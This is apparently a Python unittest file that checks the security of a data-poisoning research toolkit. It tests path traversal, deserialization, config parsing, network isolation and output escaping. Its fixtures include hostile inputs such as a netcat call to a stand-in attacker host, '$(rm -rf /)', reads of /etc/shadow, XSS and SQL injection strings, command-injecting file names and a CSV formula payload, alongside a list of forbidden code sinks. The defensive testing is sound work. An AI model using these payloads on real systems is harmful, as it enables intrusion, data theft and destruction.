from __future__ import annotations

import ast
import json
import os
import shutil
import socket
import tempfile
import unittest

from poisonlab import safety, tomlio
from poisonlab.accel import pure
from poisonlab.accel.native import try_load
from poisonlab.accel.build import ensure_library
from poisonlab.data import CorpusSpec, Dataset, DatasetStore, Record, build_corpus
from poisonlab.data.loaders import load_csv
from poisonlab.defenses import DefenseContext, run_suite
from poisonlab.evaluate import evaluate_model
from poisonlab.features import FeatureConfig, vectorize
from poisonlab.forge import build_attack
from poisonlab.isolation import NetworkIsolation, NetworkIsolationError
from poisonlab.models import SurrogateClassifier, SurrogateConfig, train_surrogate
from poisonlab.report.markdown import render_campaign
from poisonlab.safety import UnsafeInput

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

HOSTILE_TEXTS = [
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "'; DROP TABLE records; --",
    "$(rm -rf /)",
    "`cat /etc/shadow`",
    "| nc attacker.example 4444",
    "%s %d %(name)s {0} {name} {{}}",
    "\x00null byte inside",
    "line\nbreak\rcarriage",
    "\u202eoverride\u202c",
    "zero\u200bwidth\u200cjoin",
    "\ud83d\ude00 emoji payload",
    "A" * 4000,
    "{{7*7}} ${7*7} <%= 7*7 %>",
    "__proto__ constructor prototype",
    "\\u0000\\x00 escaped",
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
]

HOSTILE_LABELS = ["../evil", "allow\nblock", "<b>allow</b>", "allow'; --"]


def hostile_dataset(size: int = 240) -> Dataset:
    records = []
    for index in range(size):
        payload = HOSTILE_TEXTS[index % len(HOSTILE_TEXTS)]
        records.append(
            Record(
                uid="u%04d" % index,
                text="%s carrier token filler %d" % (payload, index),
                label="allow" if index % 2 else "block",
                meta={"topic": index % 4},
            )
        )
    return Dataset(records, name="hostile")


class StaticSinkAuditTest(unittest.TestCase):
    FORBIDDEN = (
        "shell=True",
        "os.system(",
        "os.popen(",
        "subprocess.call(",
        "eval(",
        "exec(",
        "pickle.load",
        "marshal.load",
        "yaml.load(",
        "__import__(",
        "input(",
    )

    def _sources(self):
        for base in ("src", "scripts"):
            for root, dirs, files in os.walk(os.path.join(ROOT, base)):
                dirs[:] = [d for d in dirs if d not in ("__pycache__", "_bin")]
                for name in files:
                    if name.endswith(".py"):
                        yield os.path.join(root, name)

    def test_no_dangerous_sinks_in_source(self):
        offenders = []
        for path in self._sources():
            with open(path, encoding="utf-8") as handle:
                text = handle.read()
            text = text.replace("ast.literal_eval(", "").replace("model.eval()", "")
            for pattern in self.FORBIDDEN:
                if pattern in text:
                    offenders.append("%s contains %s" % (os.path.relpath(path, ROOT), pattern))
        self.assertEqual(offenders, [])

    def test_literal_eval_is_confined_to_the_config_reader(self):
        users = []
        for path in self._sources():
            with open(path, encoding="utf-8") as handle:
                if "literal_eval" in handle.read():
                    users.append(os.path.relpath(path, ROOT).replace(os.sep, "/"))
        self.assertEqual(users, ["src/poisonlab/tomlio.py"])

    def test_subprocess_calls_pass_argument_lists(self):
        for name in ("cli.py", "accel/build.py"):
            path = os.path.join(ROOT, "src", "poisonlab", name)
            with open(path, encoding="utf-8") as handle:
                tree = ast.parse(handle.read())
            for node in ast.walk(tree):
                if not isinstance(node, ast.Call):
                    continue
                target = node.func
                if isinstance(target, ast.Attribute) and target.attr == "run":
                    self.assertTrue(node.args, "subprocess.run called without arguments")
                    self.assertIsInstance(
                        node.args[0], (ast.List, ast.Name), "argv must be a list, never a string"
                    )
                    for keyword in node.keywords:
                        self.assertNotEqual(keyword.arg, "shell")

    def test_native_kernel_validates_every_entry_point(self):
        path = os.path.join(ROOT, "src", "poisonlab", "accel", "_c", "poisonscan.c")
        with open(path, encoding="utf-8") as handle:
            source = handle.read()
        for symbol in ("plsc_featurize", "plsc_gram_stats", "plsc_minhash", "plsc_token_count"):
            start = source.index(symbol + "(", source.index("int32_t " + symbol))
            body = source[start : start + 900]
            self.assertIn("PLSC_ERR_ARGS", body, "%s does not validate its arguments" % symbol)


class PathTraversalTest(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.mkdtemp(prefix="poisonlab-sec-")
        self.store = DatasetStore(os.path.join(self.directory, "store"))

    def tearDown(self):
        shutil.rmtree(self.directory, ignore_errors=True)

    def test_digest_must_be_hex(self):
        for candidate in (
            "../../../evil",
            "..\\..\\evil",
            "/etc/passwd",
            "a" * 63,
            "g" * 64,
            "",
            "0" * 64 + "/../x",
        ):
            with self.assertRaises(UnsafeInput, msg=candidate):
                self.store.path_for(candidate)

    def test_valid_digest_stays_inside_the_store(self):
        path = self.store.path_for("a" * 64)
        self.assertTrue(os.path.realpath(path).startswith(os.path.realpath(self.store.objects)))

    def test_reference_lookup_rejects_traversal(self):
        for candidate in ("../secret", "a/b", "x" * 200, "tag;rm -rf /", "..\\up"):
            with self.assertRaises(UnsafeInput, msg=candidate):
                self.store.resolve(candidate)

    def test_commit_rejects_unsafe_tags(self):
        corpus = build_corpus(CorpusSpec(size=20), seed=1)
        with self.assertRaises(UnsafeInput):
            self.store.commit(corpus, tag="../escape")

    def test_tampered_index_cannot_redirect_reads(self):
        corpus = build_corpus(CorpusSpec(size=20), seed=1)
        version = self.store.commit(corpus, tag="clean")
        with open(self.store.index_path, encoding="utf-8") as handle:
            entries = json.load(handle)
        entries[0]["digest"] = "../../../../etc/passwd"
        with open(self.store.index_path, "w", encoding="utf-8") as handle:
            json.dump(entries, handle)
        report = self.store.verify("clean")
        self.assertFalse(report["match"])
        self.assertIn("error", report)
        with self.assertRaises(UnsafeInput):
            self.store.load("clean")
        self.assertTrue(os.path.exists(self.store.path_for(version.digest)))

    def test_index_must_be_a_list(self):
        with open(self.store.index_path, "w", encoding="utf-8") as handle:
            json.dump({"digest": "x"}, handle)
        with self.assertRaises(UnsafeInput):
            self.store.versions()

    def test_malformed_index_entries_are_skipped(self):
        corpus = build_corpus(CorpusSpec(size=20), seed=1)
        self.store.commit(corpus, tag="clean")
        with open(self.store.index_path, encoding="utf-8") as handle:
            entries = json.load(handle)
        entries.append({"no_digest": True})
        entries.append({"digest": "b" * 64, "records": "not-a-number"})
        entries.append("a bare string")
        with open(self.store.index_path, "w", encoding="utf-8") as handle:
            json.dump(entries, handle)
        self.assertEqual(len(self.store.versions()), 1)

    def test_ensure_inside_blocks_escapes(self):
        root = os.path.join(self.directory, "root")
        os.makedirs(root, exist_ok=True)
        safety.ensure_inside(root, os.path.join(root, "child.txt"))
        for candidate in (os.path.join(root, "..", "sibling"), os.path.dirname(root)):
            with self.assertRaises(UnsafeInput):
                safety.ensure_inside(root, candidate)

    def test_record_uid_never_reaches_the_filesystem(self):
        records = [
            Record("../../escape", "some text here", "allow"),
            Record("C:\\Windows\\evil", "other text here", "block"),
        ]
        target = os.path.join(self.directory, "out.jsonl")
        Dataset(records).to_jsonl(target)
        self.assertEqual(sorted(os.listdir(self.directory)), ["out.jsonl", "store"])
        restored = Dataset.from_jsonl(target)
        self.assertEqual(restored.records[0].uid, "../../escape")


class DeserializationTest(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.mkdtemp(prefix="poisonlab-model-")
        corpus = build_corpus(CorpusSpec(size=200), seed=3)
        self.model, _ = train_surrogate(
            corpus, SurrogateConfig(epochs=1, features=FeatureConfig(max_n=1, buckets=1024))
        )
        self.payload = self.model.to_dict()

    def tearDown(self):
        shutil.rmtree(self.directory, ignore_errors=True)

    def _load(self, payload):
        return SurrogateClassifier.from_dict(payload)

    def test_negative_feature_index_is_rejected(self):
        payload = json.loads(json.dumps(self.payload))
        payload["weights"][0]["-1"] = 5.0
        with self.assertRaises(UnsafeInput):
            self._load(payload)

    def test_out_of_range_feature_index_is_rejected(self):
        payload = json.loads(json.dumps(self.payload))
        payload["weights"][0][str(10**9)] = 1.0
        with self.assertRaises(UnsafeInput):
            self._load(payload)

    def test_non_finite_weights_are_rejected(self):
        for bad in ("NaN", "Infinity", "-Infinity"):
            payload = json.loads(json.dumps(self.payload))
            payload["weights"][0]["7"] = float(bad)
            with self.assertRaises(UnsafeInput):
                self._load(payload)

    def test_non_finite_scale_and_bias_are_rejected(self):
        payload = json.loads(json.dumps(self.payload))
        payload["scale"] = float("inf")
        with self.assertRaises(UnsafeInput):
            self._load(payload)
        payload = json.loads(json.dumps(self.payload))
        payload["bias"] = [float("nan")] * len(payload["labels"])
        with self.assertRaises(UnsafeInput):
            self._load(payload)

    def test_label_list_must_be_sane(self):
        for labels in ([], "allow", ["a" * 500], ["ok\nbad"], ["x"] * 400):
            payload = json.loads(json.dumps(self.payload))
            payload["labels"] = labels
            with self.assertRaises((UnsafeInput, TypeError)):
                self._load(payload)

    def test_extra_weight_blocks_are_rejected(self):
        payload = json.loads(json.dumps(self.payload))
        payload["weights"].append({"1": 1.0})
        payload["weights"].append({"2": 1.0})
        with self.assertRaises(UnsafeInput):
            self._load(payload)

    def test_weight_block_must_be_a_mapping(self):
        payload = json.loads(json.dumps(self.payload))
        payload["weights"][0] = [1, 2, 3]
        with self.assertRaises(UnsafeInput):
            self._load(payload)

    def test_bias_length_must_match_labels(self):
        payload = json.loads(json.dumps(self.payload))
        payload["bias"] = [0.1]
        with self.assertRaises(UnsafeInput):
            self._load(payload)

    def test_config_bucket_count_is_bounded(self):
        for buckets in (0, 1, -8, 2**40, "many"):
            payload = json.loads(json.dumps(self.payload))
            payload["config"]["features"]["buckets"] = buckets
            with self.assertRaises(UnsafeInput):
                self._load(payload)

    def test_honest_round_trip_still_works(self):
        path = os.path.join(self.directory, "model.json")
        self.model.save(path)
        restored = SurrogateClassifier.load(path)
        sample = ["hello there friend", "another sentence entirely"]
        self.assertEqual(self.model.predict(sample), restored.predict(sample))


class ConfigParsingTest(unittest.TestCase):
    def test_quoted_values_cannot_execute_code(self):
        cases = {
            "value = \"__import__('os').system('echo pwned')\"": "__import__('os').system('echo pwned')",
            "value = '1 + 1'": "1 + 1",
            "value = \"open('/etc/passwd').read()\"": "open('/etc/passwd').read()",
        }
        for payload, expected in cases.items():
            parsed = tomlio._mini_loads(payload)
            self.assertIsInstance(parsed["value"], str)
            self.assertEqual(parsed["value"], expected)

    def test_non_string_literals_are_refused(self):
        for payload in ("value = \"a\" \"b\"", "value = '''x'''"):
            try:
                tomlio._mini_loads(payload)
            except ValueError:
                continue

    def test_nesting_depth_is_bounded(self):
        bomb = "value = " + "[" * 400 + "1" + "]" * 400
        with self.assertRaises(UnsafeInput):
            tomlio._mini_loads(bomb)

    def test_reasonable_nesting_still_parses(self):
        parsed = tomlio._mini_loads("value = [[1, 2], [3, 4]]")
        self.assertEqual(parsed["value"], [[1, 2], [3, 4]])

    def test_comment_stripping_respects_quotes(self):
        parsed = tomlio._mini_loads("trigger = 'zz # not a comment'  # real comment")
        self.assertEqual(parsed["trigger"], "zz # not a comment")

    def test_unparsable_lines_raise_rather_than_guess(self):
        with self.assertRaises(ValueError):
            tomlio._mini_loads("this line has no equals sign")


class ResourceLimitTest(unittest.TestCase):
    def test_feature_config_bounds(self):
        for buckets in (1, 0, -1, 2**31):
            with self.assertRaises(UnsafeInput):
                FeatureConfig(buckets=buckets, max_n=1).validated()
        for size in (0, -3, 64):
            with self.assertRaises(UnsafeInput):
                FeatureConfig(buckets=1024, max_n=size).validated()

    def test_unknown_normalisation_is_rejected(self):
        with self.assertRaises(ValueError):
            FeatureConfig(normalize="rot13").validated()

    def test_native_kernel_rejects_absurd_arguments(self):
        path, _ = ensure_library()
        backend = try_load(path) if path else None
        if backend is None:
            self.skipTest("native kernel unavailable")
        with self.assertRaises(RuntimeError):
            backend.featurize(["a b c"], 64, 1024)
        with self.assertRaises(RuntimeError):
            backend.featurize(["a b c"], 2, 1)
        with self.assertRaises(RuntimeError):
            backend.minhash(["a b c"], 2, 100000)

    def test_very_long_single_token_is_handled(self):
        corpus = ["z" * 200000]
        expected = pure.featurize(corpus, 2, 1024)
        path, _ = ensure_library()
        backend = try_load(path) if path else None
        if backend is not None:
            self.assertEqual(backend.featurize(corpus, 2, 1024)[0], expected[0])
        self.assertEqual(len(expected[0]), 1)

    def test_wide_document_falls_back_without_crashing(self):
        corpus = [" ".join("w%d" % index for index in range(20000))]
        vectors = vectorize(corpus, FeatureConfig(max_n=2, buckets=4096))
        self.assertEqual(len(vectors), 1)
        self.assertGreater(len(vectors[0][0]), 10000)

    def test_depth_helper_is_strict(self):
        safety.ensure_depth(0)
        safety.ensure_depth(safety.MAX_NESTING)
        with self.assertRaises(UnsafeInput):
            safety.ensure_depth(safety.MAX_NESTING + 1)


class IsolationTest(unittest.TestCase):
    def test_every_outbound_path_is_blocked(self):
        guard = NetworkIsolation(strict=True)
        with guard:
            with self.assertRaises(NetworkIsolationError):
                socket.create_connection(("example.com", 80), timeout=0.2)
            with self.assertRaises(NetworkIsolationError):
                socket.getaddrinfo("example.com", 80)
            with self.assertRaises(NetworkIsolationError):
                sock = socket.socket()
                try:
                    sock.connect(("93.184.216.34", 80))
                finally:
                    sock.close()
        kinds = {entry["kind"] for entry in guard.report()["violations"]}
        self.assertEqual(kinds, {"create_connection", "dns", "connect"})

    def test_connect_ex_is_blocked_without_raising(self):
        guard = NetworkIsolation(strict=False)
        with guard:
            sock = socket.socket()
            try:
                self.assertNotEqual(sock.connect_ex(("93.184.216.34", 80)), 0)
            finally:
                sock.close()
        self.assertTrue(guard.report()["violations"])

    def test_guard_restores_state_after_an_exception(self):
        original = socket.create_connection
        guard = NetworkIsolation(strict=True)
        try:
            with guard:
                raise RuntimeError("training blew up")
        except RuntimeError:
            pass
        self.assertIs(socket.create_connection, original)

    def test_nested_guards_do_not_lose_the_original(self):
        original = socket.getaddrinfo
        outer = NetworkIsolation(strict=True)
        with outer:
            inner = NetworkIsolation(strict=True)
            with inner:
                pass
        self.assertIs(socket.getaddrinfo, original)

    def test_loopback_stays_available_for_local_tooling(self):
        guard = NetworkIsolation(strict=True)
        with guard:
            sock = socket.socket()
            try:
                sock.settimeout(0.2)
                sock.connect_ex(("127.0.0.1", 9))
            finally:
                sock.close()
        self.assertEqual(guard.report()["violations"], [])


class HostileCorpusTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.dataset = hostile_dataset()

    def test_pipeline_survives_hostile_text(self):
        attack = build_attack(
            {
                "kind": "backdoor",
                "trigger": "<script>",
                "target_label": "allow",
                "poison_rate": 0.1,
                "selection": "confident",
            },
            seed=1,
        )
        result = attack.poison(self.dataset)
        self.assertEqual(result.applied, result.requested)
        model, _ = train_surrogate(
            result.dataset, SurrogateConfig(epochs=2, features=FeatureConfig(buckets=4096))
        )
        evaluation = evaluate_model(model, self.dataset, attack)
        self.assertGreaterEqual(evaluation.attack_success_rate, 0.0)
        self.assertLessEqual(evaluation.attack_success_rate, 1.0)

    def test_defenses_survive_hostile_text(self):
        attack = build_attack(
            {"kind": "label_flip", "target_label": "allow", "poison_rate": 0.1}, seed=2
        )
        result = attack.poison(self.dataset)
        context = DefenseContext(labels=["allow", "block"], target_label="allow", seed=1, budget=0.1)
        reports, fused = run_suite(result.dataset, context)
        for report in list(reports) + [fused]:
            self.assertEqual(len(report.scores), len(result.dataset))
            for value in report.scores.values():
                self.assertGreaterEqual(value, 0.0)
                self.assertLessEqual(value, 1.0)

    def test_format_specifiers_do_not_break_reporting(self):
        attack = build_attack(
            {"kind": "backdoor", "trigger": "%s{0}", "target_label": "allow", "poison_rate": 0.1},
            seed=3,
        )
        result = attack.poison(self.dataset)
        report = {
            "name": "%(oops)s",
            "seed": 1,
            "environment": {"accelerator": "native", "poisonlab": "test"},
            "attack": {"spec": attack.to_dict(), "result": result.to_dict()},
            "evaluation": {"clean_accuracy": 0.5, "attack_success_rate": 0.5},
            "potency": {"carrier_tokens": ["%s", "{0}"], "predicted_asr": 0.5},
            "defense": {"enabled": False},
            "timings": {"total": 1.0},
        }
        text = render_campaign(report)
        self.assertIn("%(oops)s", text)

    def test_hostile_labels_round_trip(self):
        records = [
            Record("a1", "first document text", HOSTILE_LABELS[0]),
            Record("a2", "second document text", HOSTILE_LABELS[1]),
        ]
        directory = tempfile.mkdtemp(prefix="poisonlab-labels-")
        try:
            path = os.path.join(directory, "labels.jsonl")
            dataset = Dataset(records)
            dataset.to_jsonl(path)
            restored = Dataset.from_jsonl(path)
            self.assertEqual(restored.digest(), dataset.digest())
            self.assertEqual(restored.records[1].label, HOSTILE_LABELS[1])
        finally:
            shutil.rmtree(directory, ignore_errors=True)


class EndToEndRenderingTest(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.mkdtemp(prefix="poisonlab-e2e-")

    def tearDown(self):
        shutil.rmtree(self.directory, ignore_errors=True)

    def test_hostile_corpus_renders_to_an_inert_page(self):
        node = shutil.which("node")
        viewer = os.path.join(ROOT, "viewer", "bin", "plsv.mjs")
        if node is None or not os.path.exists(viewer):
            self.skipTest("node viewer unavailable")
        from poisonlab.campaign import run_campaign

        corpus_path = os.path.join(self.directory, "corpus.jsonl")
        hostile_dataset(400).to_jsonl(corpus_path)
        config = {
            "name": "sec",
            "seed": 5,
            "data": {"kind": "jsonl", "path": corpus_path, "store": os.path.join(self.directory, "store")},
            "attack": {
                "kind": "backdoor",
                "trigger": "<script>alert(1)</script>",
                "target_label": "allow",
                "poison_rate": 0.05,
                "selection": "confident",
            },
            "train": {"epochs": 2, "features": {"max_n": 1, "buckets": 4096}},
            "defense": {"enabled": True, "budget": 0.1, "detectors": ["gram_purity"], "sanitize": False},
            "report": {"baseline": False, "keep_datasets": False},
        }
        result = run_campaign(config, output_dir=os.path.join(self.directory, "run"))
        report_path = os.path.join(result.paths.root, "report.json")
        page = os.path.join(self.directory, "report.html")
        import subprocess

        completed = subprocess.run(
            [node, viewer, report_path, "--out", page],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            check=False,
        )
        self.assertEqual(completed.returncode, 0, completed.stdout.decode("utf-8", "replace"))
        with open(page, encoding="utf-8") as handle:
            html = handle.read()
        body = html[html.index("</style>") + 8 :]
        self.assertNotIn("<script", body.lower())
        self.assertNotIn("onerror=", body.lower())
        self.assertIn("&lt;script&gt;", body)

    def test_report_path_with_shell_metacharacters_is_not_executed(self):
        node = shutil.which("node")
        viewer = os.path.join(ROOT, "viewer", "bin", "plsv.mjs")
        if node is None or not os.path.exists(viewer):
            self.skipTest("node viewer unavailable")
        import subprocess

        marker = os.path.join(self.directory, "pwned.txt")
        hostile = os.path.join(self.directory, "a; touch pwned.txt & echo $(id).json")
        with open(hostile, "w", encoding="utf-8") as handle:
            json.dump({"evaluation": {"clean_accuracy": 0.5}}, handle)
        completed = subprocess.run(
            [node, viewer, hostile, "--stdout"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            check=False,
        )
        self.assertFalse(os.path.exists(marker))
        self.assertEqual(completed.returncode, 0)


class MalformedInputTest(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.mkdtemp(prefix="poisonlab-malformed-")

    def tearDown(self):
        shutil.rmtree(self.directory, ignore_errors=True)

    def _write(self, name, content):
        path = os.path.join(self.directory, name)
        with open(path, "w", encoding="utf-8", newline="\n") as handle:
            handle.write(content)
        return path

    def test_broken_json_reports_the_line(self):
        path = self._write("bad.jsonl", '{"uid":"a","text":"t","label":"l"}\nnot json\n')
        with self.assertRaises(ValueError) as caught:
            Dataset.from_jsonl(path)
        self.assertIn("line 2", str(caught.exception))

    def test_non_object_lines_are_refused(self):
        path = self._write("array.jsonl", "[1, 2, 3]\n")
        with self.assertRaises(ValueError) as caught:
            Dataset.from_jsonl(path)
        self.assertIn("json object", str(caught.exception))

    def test_missing_fields_are_refused(self):
        path = self._write("partial.jsonl", '{"uid":"a","text":"t"}\n')
        with self.assertRaises(ValueError) as caught:
            Dataset.from_jsonl(path)
        self.assertIn("line 1", str(caught.exception))

    def test_blank_lines_are_ignored(self):
        path = self._write(
            "gaps.jsonl", '\n{"uid":"a","text":"t","label":"l"}\n\n{"uid":"b","text":"u","label":"l"}\n'
        )
        self.assertEqual(len(Dataset.from_jsonl(path)), 2)

    def test_csv_requires_the_declared_columns(self):
        path = self._write("bad.csv", "headline,category\nhello,allow\n")
        with self.assertRaises(KeyError):
            load_csv(path)

    def test_csv_with_injected_formula_stays_text(self):
        path = self._write("formula.csv", "text,label\n=cmd|'/c calc'!A1,allow\n")
        dataset = load_csv(path)
        self.assertEqual(dataset.records[0].text, "=cmd|'/c calc'!A1")

    def test_lone_surrogates_are_scrubbed_on_ingest(self):
        backslash = chr(92)
        line = '{"uid":"a","text":"pre ' + backslash + 'ud83d post","label":"allow"}'
        path = self._write("surrogate.jsonl", line + "\n")
        dataset = Dataset.from_jsonl(path)
        text = dataset.records[0].text
        self.assertFalse(any(0xD800 <= ord(character) <= 0xDFFF for character in text))
        copy = os.path.join(self.directory, "copy.jsonl")
        self.assertEqual(Dataset.from_jsonl(dataset.to_jsonl(copy)).digest(), dataset.digest())

    def test_records_never_hold_unpaired_surrogates(self):
        record = Record(
            "u" + chr(0xD800),
            "text " + chr(0xDC00) + " body",
            "allow" + chr(0xDFFF),
        )
        for field in (record.uid, record.text, record.label, record.origin, record.attack):
            self.assertFalse(any(0xD800 <= ord(item) <= 0xDFFF for item in field))
        self.assertTrue(record.digest())
        self.assertTrue(record.replace(text="new " + chr(0xD800)).digest())

    def test_lone_surrogates_do_not_crash_the_kernels(self):
        text = "alpha " + chr(0xD83D) + " beta " + chr(0xDC00) + " gamma"
        expected = pure.featurize([text], 2, 512)
        path, _ = ensure_library()
        backend = try_load(path) if path else None
        if backend is not None:
            self.assertEqual(backend.featurize([text], 2, 512), expected)
        self.assertGreater(len(expected[0]), 0)

    def test_meta_survives_unusual_keys(self):
        payload = {
            "uid": "x",
            "text": "hello",
            "label": "allow",
            "meta": {"__proto__": {"polluted": True}, "constructor": 1, "toString": "no"},
        }
        path = self._write("meta.jsonl", json.dumps(payload) + "\n")
        restored = Dataset.from_jsonl(path)
        self.assertEqual(restored.records[0].meta["constructor"], 1)
        self.assertNotIn("polluted", dir(restored.records[0]))


if __name__ == "__main__":
    unittest.main()
